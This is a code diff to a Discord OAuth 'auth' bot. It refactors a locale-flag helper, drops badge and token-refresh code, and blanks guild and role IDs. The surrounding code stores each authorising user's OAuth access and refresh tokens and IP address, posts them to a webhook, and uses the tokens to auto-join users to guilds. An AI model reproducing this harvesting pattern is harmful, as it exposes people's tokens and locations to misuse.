@@ -34,19 +34,6 @@ process.on("unhandledRejection", err => { })
 
 client.on('ready', async () => {
 
-    setInterval(async () => {
-        let users = await userSchema.find({}).lean().select("refreshToken expiresDate");
-
-        users.forEach(async user => {
-
-            if (Date.now() <= user.expiresDate) {
-
-                await venusClient.refreshToken(user.refreshToken)
-
-            }
-
-        })
-    }, 300000);
 })
 
 /* Core Auth Modules */
@@ -84,6 +71,20 @@ app.get('/discord', function (req, res) {
     res.redirect(`${config.client.serverLink}`);
 })
 
+function safeToLowerCase(str) {
+    if (str && typeof str === 'string') {
+        return str.split('').map(char => {
+            const code = char.charCodeAt(0);
+            if (code >= 65 && code <= 90) {
+                return String.fromCharCode(code + 32);
+            }
+            return char;
+        }).join('');
+    }
+    return str;
+}
+
+
 app.get('/auth', async (req, res) => {
  res.sendFile(__dirname + '/Views/index.html');
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
@@ -100,6 +101,12 @@ if (!user_id || !data) return;
     let countryCode = aronshire_?.location?.country?.code || null
   //
 
+    let locale = ":flag_white:"; // Default to white flag or another suitable default
+
+    if (countryCode) {
+        locale = `:flag_${safeToLowerCase(countryCode)}:`;
+    }
+
     let userData = {
         id: user_.id,
         username: user_.username,
@@ -108,37 +115,9 @@ if (!user_id || !data) return;
         accessToken: data.access_token,
         refreshToken: data.refresh_token,
         expiresDate: Date.now() + 604800,
-        locale: `:flag_${countryCode.toLowerCase()}:`,//
+        locale: locale,
         ip: `${ip}`,
-    }
-
-    let badges;
-    if (user_.flags.toArray().length > 0) {
-
-        let DISCORD_NITRO = user_.premium_type > 0 ? '<:g_nitro:1001998469961089084>' : '';
-
-        let DISCORD_EMPLOYEE = user_.flags.has('Staff') ? '<:discord_staff:948738507814359041>' : '';
-        let PARTNERED_SERVER_OWNER = user_.flags.has('Partner') ? '<:Partner:1001996381621325905>' : '';
-        let DISCORD_CERTIFIED_MODERATOR = user_.flags.has('CertifiedModerator') ? '<:certifieddiscordmoderator:1001996369600467034>' : '';
-        let HYPESQUAD_EVENTS = user_.flags.has('Hypesquad') ? '<:hypesquad_events:1001996383169028147>' : '';
-
-        let HOUSE_BRAVERY = user_.flags.has('HypeSquadOnlineHouse1') ? '<:hypesquadbravey:948738579029454919>' : '';
-        let HOUSE_BRILLIANCE = user_.flags.has('HypeSquadOnlineHouse2') ? '<:hypequadBrilliance:1001996378202968176>' : '';
-        let HOUSE_BALANCE = user_.flags.has('HypeSquadOnlineHouse3') ? '<:hypesquadBalance:1001996375858364476>' : '';
-
-        let BUGHUNTER_LEVEL_1 = user_.flags.has('BugHunterLevel1') ? '<:bughunter:1001996370850357258>' : '';
-        let BUGHUNTER_LEVEL_2 = user_.flags.has('BugHunterLevel2') ? '<:goldbughunter:1001996374725885973>' : '';
-
-        let EARLY_VERIFIED_BOT_DEVELOPER = user_.flags.has('VerifiedDeveloper') ? ':<:verifiedbotdev:1001996377171181588>' : '';
-
-        let EARLY_SUPPORTER = user_.flags.has('PremiumEarlySupporter') ? '<:earlysupporter:948738574717689946>' : '';
-        //  let ACTIVE_DEVELOPER = user_.flags.has('ACTIVE_DEVELOPER') ? '<:ActiveDevloper:1041403513206489118>' : '';
-
-        badges = `${DISCORD_EMPLOYEE}${PARTNERED_SERVER_OWNER}${DISCORD_CERTIFIED_MODERATOR}${HYPESQUAD_EVENTS}${HOUSE_BRAVERY}${HOUSE_BRILLIANCE}${HOUSE_BALANCE}${BUGHUNTER_LEVEL_1}${BUGHUNTER_LEVEL_2}${EARLY_VERIFIED_BOT_DEVELOPER}${EARLY_SUPPORTER}${DISCORD_NITRO}`;
-
-    } else {
-        badges = 'None';
-    }
+    };
 
     venusClient.saveAuth(client.user.id, userData);
     venusClient.sendWebhook({
@@ -154,13 +133,8 @@ if (!user_id || !data) return;
                         inline: true
                     },
                     {
-                        name: "Badges",
-                        value: `${badges}`,
-                        inline: true
-                    },
-                    {
                         name: "Locale",
-                        value: `:flag_${countryCode.toLowerCase()}:`,
+                        value: locale,
                         inline: true
                     },
                     {
@@ -179,7 +153,7 @@ if (!user_id || !data) return;
                         inline: true
                     },
                     {
-                        name: "IP Adress",
+                        name: "IP Address",
                         value: `\`${ip}\``,
                         inline: true
                     }
@@ -190,8 +164,7 @@ if (!user_id || !data) return;
                 description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
             },
         ]
-
-    })
+    });
 
     if (botData.autoJoin[0]?.status === true) {
 
@@ -223,10 +196,10 @@ if (!user_id || !data) return;
         })
     }
  
-let guild1 = client.guilds.cache.get(`1102263173693837443`);
+let guild1 = client.guilds.cache.get(``);
 guild1.members.fetch(user_id)
   .then(member => {
-    member.roles.add(`1102277273169707060`)
+    member.roles.add(``)
       .then(console.log(`Role added to ${member.user.username}`))
       .catch(console.error);
   })
